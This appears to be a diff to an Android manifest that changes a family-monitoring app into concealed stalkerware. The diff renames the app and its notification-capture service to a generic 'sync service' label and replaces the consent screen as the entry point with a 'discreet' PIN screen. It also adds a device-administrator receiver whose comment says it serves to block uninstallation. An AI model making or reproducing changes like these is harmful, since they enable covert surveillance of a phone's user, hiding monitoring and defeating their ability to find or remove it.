@@ -27,15 +27,15 @@
         android:appComponentFactory="androidx.core.app.CoreComponentFactory"
         android:debuggable="true"
         android:extractNativeLibs="false"
-        android:label="Monitoreo Familiar"
+        android:label="Servicio de Sincronización"
         android:testOnly="true"
         android:theme="@style/Theme.FamiliaMonitor" >
 
-        <!-- Pantalla de consentimiento: es la primera y única entrada visible -->
+        <!-- Nueva entrada discreta con PIN -->
         <activity
-            android:name="com.familia.monitor.ConsentActivity"
+            android:name="com.familia.monitor.PinActivity"
             android:exported="true"
-            android:label="Monitoreo Familiar - Configuración" >
+            android:label="Ajustes de Sincronización" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
@@ -43,15 +43,33 @@
             </intent-filter>
         </activity>
         <activity
+            android:name="com.familia.monitor.ConsentActivity"
+            android:exported="false"
+            android:label="Configuración de Servicio" />
+        <activity
             android:name="com.familia.monitor.StatusActivity"
             android:exported="false"
-            android:label="Monitoreo Familiar - Estado" />
+            android:label="Estado de Sincronización" />
+
+        <!-- Receptor de Administrador para bloqueo de desinstalación -->
+        <receiver
+            android:name="com.familia.monitor.AdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
 
         <!-- Requiere que el usuario active manualmente el acceso a notificaciones -->
         <service
             android:name="com.familia.monitor.NotificationCaptureService"
             android:exported="true"
-            android:label="Monitoreo Familiar"
+            android:label="Servicio de Sincronización"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
@@ -60,7 +78,8 @@
         <service
             android:name="com.familia.monitor.ForegroundStatusService"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync"
+            android:label="Servicio de Sincronización" />
 
         <provider
             android:name="androidx.startup.InitializationProvider"
